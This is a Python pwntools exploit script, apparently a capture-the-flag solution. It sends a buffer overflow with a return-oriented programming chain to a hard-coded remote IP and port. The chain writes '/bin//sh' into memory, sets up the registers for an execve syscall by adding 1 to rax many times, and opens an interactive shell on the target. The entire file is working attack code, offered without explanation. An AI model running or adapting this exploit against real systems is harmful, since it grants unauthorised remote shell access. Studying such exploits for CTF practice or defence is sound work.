#!/usr/bin/python3
from pwn import *

context(terminal=['tmux', 'new-window'])
p = remote("65.1.92.179", 49153)
junk = "A" * 72

payload = junk.encode()

payload += p64(0x000000000040f4be) # pop rsi ; ret
payload += p64(0x00000000004c00e0) # @ .data
payload += p64(0x00000000004175eb) # pop rax ; ret
payload += '/bin//sh'.encode()
payload += p64(0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
payload += p64(0x000000000040f4be) # pop rsi ; ret
payload += p64(0x00000000004c00e8) # @ .data + 8
payload += p64(0x0000000000446959) # xor rax, rax ; ret
payload += p64(0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
payload += p64(0x000000000040191a) # pop rdi ; ret
payload += p64(0x00000000004c00e0) # @ .data
payload += p64(0x000000000040f4be) # pop rsi ; ret
payload += p64(0x00000000004c00e8) # @ .data + 8
payload += p64(0x000000000040181f) # pop rdx ; ret
payload += p64(0x00000000004c00e8) # @ .data + 8
payload += p64(0x0000000000446959) # xor rax, rax ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004774d0) # add rax, 1 ; ret
payload += p64(0x00000000004012d3) # syscall

p.recvuntil(":")
p.sendline(payload)
p.interactive()
